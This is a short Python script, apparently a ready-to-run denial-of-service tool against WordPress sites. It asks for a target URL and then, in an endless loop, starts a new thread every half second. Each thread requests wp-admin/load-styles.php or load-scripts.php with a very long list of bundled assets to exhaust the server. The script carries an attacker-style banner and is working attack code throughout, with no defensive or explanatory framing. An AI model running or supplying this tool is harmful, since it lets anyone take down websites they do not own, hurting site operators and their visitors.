import requests, time, threading
from colorama import Fore, init
init()
print(Fore.MAGENTA+"""
	======================================================
	=     @@@@@@@@@@   @@@@@@@    @@@@@@    @@@@@@ 	     =
	=     @@@@@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@	     =
	=     @@! @@! @@!  @@!  @@@       @@@  @@!  @@@	     =
	=     !@! !@! !@!  !@!  @!@      @!@   !@!  @!@	     =
	=     @!! !!@ @!@  @!@!!@!      !!@     !@!!@! 	     =
	=     !@!   ! !@!  !!@!@!      !!:      !!@!!! 	     =
	=     !!:     !!:  !!: :!!    !:!      !!:  !!!	     =
	=     :!:     :!:  :!:  !:!  :!:       :!:  !:!	     =
	=     :::     ::   ::   :::  :: :::::  ::::: ::	     =
	=     :      :     :   : :  :: : :::   : :  : 	     =
	================== INSTA : @qq_iq ====================\n\n\n""")


def startDS(wp, ch):
    try:
        head = {
            "User-Agent":"Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/78.0.3904.70 Chrome/78.0.3904.70 Safari/537.36"
        }
        if ch == "1":
            target = wp+"/wp-admin/load-styles.php?c=0&load[]=about,admin-menu,code-editor,color-picker,common,customize-controls,customize-nav-menus,cuztomize-widgets,dashboard,deprecated-media,edit,farbtastic,forms,ie,install,l1on,list-tables,login,media,nav-menus,revisions,site-health,site-icon, themes,widgets,wp-admin,admin-bar,buttons,cuztomize-preview,dashicons,editor,jquery-ui-dialog,media-views,wp-auth-check,wp-embed-template,wp-pointer"
        elif ch == "2":
            target = wp+"/wp-admin/load-scripts.php?c=1&load= eutil,common,wp-a11y,sack,quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,prototype,scriptaculous-root,scriptaculous-builder,scriptaculous-dragdrop,scriptaculous-effects,scriptaculous-slider,scriptaculous-sound,scriptaculous-controls,scriptaculous,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-repl,json2,underscore,backbone,wp-util,wp-sanitize,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrat,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,jshint,esprima,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest,admin-ba,wplink,wpdialogs,word-coun,media-upload,hoverIntent,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embe,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,updates,farbtastic,iris,wp-color-picker,dashboard,list-revision,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter"
        else:
            input("Err :: Choose One 1 or 2 !!")
            exit()
        req = requests.get(target, headers=head)
        res = req.text  
        if "window" in res:
            print(Fore.GREEN+"  [+] SUCCESS ")
        else:
            print(Fore.YELLOW+"  [-] FAILED ")
    except:
        print(Fore.RED+"  [×] Err !! ")

website = input("  WEBSITE ~> ").strip()
ch = input("\n  Choose One :\n\n  1- load styles . \n  2- load scripts .\n")
while True:
    threading.Thread(target=startDS, args=(website, ch)).start()
    time.sleep(0.5)